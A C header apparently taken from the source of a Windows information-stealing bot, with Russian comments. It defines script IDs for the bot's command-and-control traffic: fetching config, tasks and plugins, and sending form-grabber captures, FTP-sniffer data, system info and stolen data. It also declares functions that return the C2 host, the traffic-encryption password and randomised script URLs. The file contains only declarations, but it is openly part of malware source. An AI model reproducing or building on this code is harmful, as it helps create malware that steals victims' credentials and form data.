#ifndef ConfigH
#define ConfigH
//----------------------------------------------------------------------------

#include <windows.h>

//********************************************************************
//
//  Определите имя DEBUGCONFIG если необходимо что-бы бот
//  использовал отладочные настройки
//
//********************************************************************



#if !defined(DEBUGCONFIG) && defined(DEBUGBOT)
	#define DEBUGCONFIG
#endif

// Константы, номера скриптов

const BYTE  ScriptConfig      = 1;  // Путь для загрузки конфигурационного файла
const BYTE  ScriptFormGrabber = 2;  // Скрипт отправки данных HTML форм
const BYTE  ScriptTask        = 3;  // Скрипт загрузки задач
const BYTE  ScriptPlugins     = 4;  // Скрипт загрузки плагинов
const BYTE  ScriptFTPSniffer  = 5;  // Скрипт отправки данных FTP снифффера
const BYTE  ScriptFirstInfo   = 6;  // Скрипт отправки дданных о системе
const BYTE  ScriptGrabber     = 7;  // Скрипт отправки награбленных данных

#define MAX_PASSWORD_SIZE 64  // Максимальный размер пароля


char *GetCurrentHost();
PCHAR GetCurrentHost2();


// Функция возвращает пароль для криптования принимаемых/отправляемых данных
PCHAR GetMainPassword();

// Функция возвращает имя указанного скрипта
PCHAR GetBotScriptURL(BYTE Script);

// Функция генерирует случайноре имя скрипта
PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts);

int GetDelay();

char *GetPrefix();


// В отладочном режиме предоставляем возможность установить отладочный хост
#ifdef DEBUGCONFIG
void SetDebugHost(PCHAR Host);
#endif

//----------------------------------------------------------------------------
#endif

